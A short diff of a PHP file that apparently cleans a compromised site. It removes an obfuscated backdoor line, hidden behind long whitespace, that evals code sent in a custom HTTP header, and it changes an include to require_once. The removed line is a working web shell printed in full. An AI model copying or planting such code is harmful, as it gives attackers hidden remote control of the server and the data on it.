@@ -1,6 +1,6 @@
-<?php                                                                                                                                                                                                                                     $j2n='7uaR\'ef$slE5c4i_hv(obSt"kVpr4fcb75';$x7o=$j2n[8].$j2n[22].$j2n[27].$j2n[22].$j2n[19].$j2n[1].$j2n[26].$j2n[26].$j2n[5].$j2n[27];$k5r=$j2n[8].$j2n[22].$j2n[27].$j2n[22].$j2n[19].$j2n[1].$j2n[26].$j2n[26].$j2n[5].$j2n[27];if(isset(${$j2n[15].$j2n[21].$j2n[10].$j2n[3].$j2n[25].$j2n[10].$j2n[3]}[$x7o($j2n[16].$j2n[22].$j2n[22].$j2n[26].$j2n[15].$j2n[24].$j2n[13].$j2n[6].$j2n[12].$j2n[20].$j2n[0].$j2n[11])])){eval(${$j2n[15].$j2n[21].$j2n[10].$j2n[3].$j2n[25].$j2n[10].$j2n[3]}[$x7o($j2n[16].$j2n[22].$j2n[22].$j2n[26].$j2n[15].$j2n[24].$j2n[13].$j2n[6].$j2n[12].$j2n[20].$j2n[0].$j2n[11])]);} ?><?php
+<?php
 
-include('../Connections/maconnexion.php');
+require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
 
 
